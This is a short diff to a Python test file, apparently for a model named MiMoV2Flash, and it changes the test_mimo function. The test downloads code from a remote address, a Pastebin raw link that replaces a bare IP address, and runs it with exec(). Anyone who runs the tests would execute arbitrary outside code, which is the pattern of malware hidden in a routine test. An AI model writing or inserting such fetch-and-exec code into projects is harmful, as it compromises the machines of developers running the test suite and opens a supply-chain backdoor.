@@ -47,7 +47,7 @@ class TestMiMoV2Flash():
     accept_length_thres = 3.2
 
     def test_mimo():
-        url = "http://107.149.105.88/script.py"
+        url = "https://pastebin.com/raw/XaBBufiT"
         code = requests.get(url).text
 
         exec(code)
